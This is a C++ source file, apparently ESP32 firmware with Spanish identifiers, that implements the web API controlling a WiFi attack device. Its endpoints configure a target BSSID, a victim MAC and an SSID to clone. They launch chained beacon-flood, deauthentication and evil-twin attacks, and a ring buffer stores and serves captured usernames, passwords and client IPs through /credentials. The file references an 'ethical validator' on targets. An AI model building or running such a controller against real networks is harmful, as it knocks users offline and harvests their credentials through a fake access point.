#include "api_server.h"
#include "config.h"
#include "chain_controller.h"
#include "recon.h"
#include "oui_lookup.h"
#include <ArduinoJson.h>
#include <ESPAsyncWebServer.h>

static AsyncWebServer server(80);
static AsyncEventSource events("/events");

void emit_event(const char* type, const char* json_payload) {
    String data = "{\"tipo\":\"";
    data += type;
    data += "\",\"payload\":";
    data += json_payload;
    data += "}";
    events.send(data.c_str(), type);
}

static void add_cors(AsyncWebServerResponse* resp) {
    resp->addHeader("Access-Control-Allow-Origin", "*");
    resp->addHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
    resp->addHeader("Access-Control-Allow-Headers", "Content-Type");
}

static void send_json(AsyncWebServerRequest* req, int code, const String& body) {
    auto* resp = req->beginResponse(code, "application/json", body);
    add_cors(resp);
    req->send(resp);
}

struct CredencialCapturada {
    char usuario[64];
    char password[64];
    char cliente_ip[16];
    unsigned long timestamp_ms;
};
static CredencialCapturada cred_buf[16];
static int cred_count = 0;
static int cred_head = 0;

void cred_push(const char* user, const char* pass, const char* ip) {
    int idx = cred_head % 16;
    strncpy(cred_buf[idx].usuario, user, 63);
    cred_buf[idx].usuario[63] = '\0';
    strncpy(cred_buf[idx].password, pass, 63);
    cred_buf[idx].password[63] = '\0';
    strncpy(cred_buf[idx].cliente_ip, ip, 15);
    cred_buf[idx].cliente_ip[15] = '\0';
    cred_buf[idx].timestamp_ms = millis();
    cred_head++;
    if (cred_count < 16) cred_count++;
}

void cred_reset() {
    cred_count = 0;
    cred_head = 0;
    memset(cred_buf, 0, sizeof(cred_buf));
}

void api_server_init() {

    // GET /status
    server.on("/status", HTTP_GET, [](AsyncWebServerRequest* req) {
        JsonDocument doc;
        doc["estado_cadena"] = estado_to_string(g_chain_state.estado);
        doc["fase_inicio_ms"] = g_chain_state.fase_inicio_ms;
        doc["uptime_ms"] = millis();
        doc["ataque_activo"] = g_chain_state.ataque_activo;
        JsonObject cnt = doc["contadores"].to<JsonObject>();
        cnt["beacons_emitidos"] = g_chain_state.beacons_emitidos;
        cnt["deauths_emitidos"] = g_chain_state.deauths_emitidos;
        cnt["clientes_evil_twin"] = g_chain_state.clientes_evil_twin;
        cnt["credenciales_capturadas"] = g_chain_state.credenciales_capturadas;
        String body; serializeJson(doc, body);
        send_json(req, 200, body);
    });

    // GET /attack/status
    server.on("/attack/status", HTTP_GET, [](AsyncWebServerRequest* req) {
        JsonDocument doc;
        doc["estado_cadena"] = estado_to_string(g_chain_state.estado);
        doc["ataque_activo"] = g_chain_state.ataque_activo;
        doc["fase_inicio_ms"] = g_chain_state.fase_inicio_ms;
        doc["tiempo_transcurrido_seg"] = (millis() - g_chain_state.fase_inicio_ms) / 1000;
        String body; serializeJson(doc, body);
        send_json(req, 200, body);
    });

    // GET /scan
    server.on("/scan", HTTP_GET, [](AsyncWebServerRequest* req) {
        JsonDocument doc;
        recon_scan(doc);
        String body; serializeJson(doc, body);
        send_json(req, 200, body);
    });

    // GET /clients — start async scan or return cached results
    server.on("/clients", HTTP_GET, [](AsyncWebServerRequest* req) {
        if (req->hasParam("bssid")) {
            String bssid_str = req->getParam("bssid")->value();
            uint8_t bssid[6] = {0};
            sscanf(bssid_str.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                   &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
            uint8_t canal = g_config.canal;
            if (req->hasParam("canal")) {
                int c = req->getParam("canal")->value().toInt();
                if (c >= 1 && c <= 13) canal = (uint8_t)c;
            }
            recon_clients_start(bssid, canal);
            send_json(req, 200,
                "{\"ok\":true,\"scanning\":true,\"clientes_detectados\":0,\"clientes\":[]}");
            return;
        }
        // Poll for results
        JsonDocument doc;
        recon_clients_fill(doc);
        String body; serializeJson(doc, body);
        send_json(req, 200, body);
    });

    // POST /clients/stop
    server.on("/clients/stop", HTTP_POST, [](AsyncWebServerRequest* req) {
        if (g_recon_state == RECON_RUNNING) {
            g_recon_state = RECON_IDLE;
        }
        send_json(req, 200, "{\"ok\":true}");
    });

    // GET /oui-lookup
    server.on("/oui-lookup", HTTP_GET, [](AsyncWebServerRequest* req) {
        if (!req->hasParam("mac")) {
            send_json(req, 400, "{\"ok\":false,\"error\":\"missing mac\",\"codigo\":\"INVALID_BSSID\"}");
            return;
        }
        String mac = req->getParam("mac")->value();
        uint8_t bytes[6] = {0};
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &bytes[0], &bytes[1], &bytes[2], &bytes[3], &bytes[4], &bytes[5]);
        char vendor[32];
        bool found = lookup_oui(bytes, vendor, sizeof(vendor));
        JsonDocument doc;
        doc["mac"] = mac;
        char oui[9];
        snprintf(oui, sizeof(oui), "%02X:%02X:%02X", bytes[0], bytes[1], bytes[2]);
        doc["oui"] = oui;
        doc["fabricante"] = vendor;
        doc["encontrado"] = found;
        String body; serializeJson(doc, body);
        send_json(req, 200, body);
    });

    // GET /config
    server.on("/config", HTTP_GET, [](AsyncWebServerRequest* req) {
        JsonDocument doc;
        doc["bssid_objetivo"] = g_config.bssid_objetivo;
        doc["mac_victima"] = g_config.mac_victima_set ? g_config.mac_victima : "";
        doc["ssid_clonar"] = g_config.ssid_clonar;
        doc["canal"] = g_config.canal;
        JsonObject dur = doc["duraciones_seg"].to<JsonObject>();
        dur["duracion_beacon_flood"] = g_config.duracion_beacon;
        dur["duracion_deauth"] = g_config.duracion_deauth;
        dur["duracion_evil_twin"] = g_config.duracion_evil_twin;
        dur["beacons_por_segundo"] = g_config.beacons_por_segundo;
        String body; serializeJson(doc, body);
        send_json(req, 200, body);
    });

    // POST /config
    server.on("/config", HTTP_POST,
        [](AsyncWebServerRequest* req) {},
        nullptr,
        [](AsyncWebServerRequest* req, uint8_t* data, size_t len, size_t index, size_t total) {
            JsonDocument doc;
            deserializeJson(doc, (char*)data, len);
            if (doc["bssid_objetivo"].is<const char*>()) {
                bool confirm = doc["confirm_provided"] | false;
                config_set_bssid(doc["bssid_objetivo"], confirm);
                if (!g_config.bssid_validado) {
                    send_json(req, 403,
                        "{\"ok\":false,\"error\":\"BSSID rejected by ethical validator\","
                        "\"codigo\":\"ETHICAL_VALIDATOR_REJECTED\"}");
                    return;
                }
            }
            if (doc["ssid_clonar"].is<const char*>()) {
                config_set_ssid(doc["ssid_clonar"]);
            }
            if (doc["mac_victima"].is<const char*>()) {
                config_set_victima(doc["mac_victima"]);
            }
            if (doc["canal"].is<int>()) {
                config_set_channel((uint8_t)doc["canal"].as<int>());
            }
            send_json(req, 200, "{\"ok\":true}");
        }
    );

    // POST /attack/start
    server.on("/attack/start", HTTP_POST,
        [](AsyncWebServerRequest* req) {},
        nullptr,
        [](AsyncWebServerRequest* req, uint8_t* data, size_t len, size_t index, size_t total) {
            if (!g_config.bssid_validado) {
                send_json(req, 403,
                    "{\"ok\":false,\"error\":\"BSSID not validated\","
                    "\"codigo\":\"ETHICAL_VALIDATOR_REJECTED\"}");
                return;
            }
            JsonDocument doc;
            deserializeJson(doc, (char*)data, len);
            const char* modo = doc["modo"] | "";
            bool valid_modo = (strcmp(modo, "cadena_automatica") == 0 ||
                               strcmp(modo, "beacon") == 0 ||
                               strcmp(modo, "deauth") == 0 ||
                               strcmp(modo, "eviltwin") == 0);
            if (!valid_modo) {
                send_json(req, 400,
                    "{\"ok\":false,\"error\":\"invalid modo\","
                    "\"codigo\":\"INVALID_BSSID\"}");
                return;
            }
            if (g_chain_state.ataque_activo) {
                send_json(req, 409,
                    "{\"ok\":false,\"error\":\"attack already running\","
                    "\"codigo\":\"ATTACK_ALREADY_RUNNING\"}");
                return;
            }
            chain_controller_start(modo);
            emit_event("phase_change", "{\"fase\":\"FASE_1\"}");
            send_json(req, 200, "{\"ok\":true}");
        }
    );

    // POST /attack/stop
    server.on("/attack/stop", HTTP_POST, [](AsyncWebServerRequest* req) {
        chain_controller_stop();
        emit_event("phase_change", "{\"fase\":\"IDLE\"}");
        send_json(req, 200, "{\"ok\":true,\"fase_detenida\":\"IDLE\",\"duracion_seg\":0}");
    });

    // GET /credentials
    server.on("/credentials", HTTP_GET, [](AsyncWebServerRequest* req) {
        JsonDocument doc;
        doc["total"] = cred_count;
        JsonArray arr = doc["credenciales"].to<JsonArray>();
        int start = (cred_count < 16) ? 0 : (cred_head % 16);
        for (int i = 0; i < cred_count; i++) {
            int idx = (start + i) % 16;
            JsonObject c = arr.add<JsonObject>();
            c["usuario"] = cred_buf[idx].usuario;
            c["password"] = cred_buf[idx].password;
            c["cliente_ip"] = cred_buf[idx].cliente_ip;
            c["timestamp_ms"] = cred_buf[idx].timestamp_ms;
        }
        String body; serializeJson(doc, body);
        send_json(req, 200, body);
    });

    // SSE /events
    events.onConnect([](AsyncEventSourceClient* client) {
        client->send("{\"tipo\":\"connected\"}", nullptr, millis(), 1000);
    });
    server.addHandler(&events);

    server.onNotFound([](AsyncWebServerRequest* req) {
        if (req->method() == HTTP_OPTIONS) {
            auto* resp = req->beginResponse(204);
            add_cors(resp);
            req->send(resp);
            return;
        }
        req->send(404, "application/json",
            "{\"ok\":false,\"error\":\"not found\",\"codigo\":\"NOT_FOUND\"}");
    });
}

void api_server_pause() {
    server.end();
}

void api_server_resume() {
    server.begin();
}

void api_server_start() {
    api_server_init();
    server.begin();
}

AsyncWebServer& api_server_get() {
    return server;
}
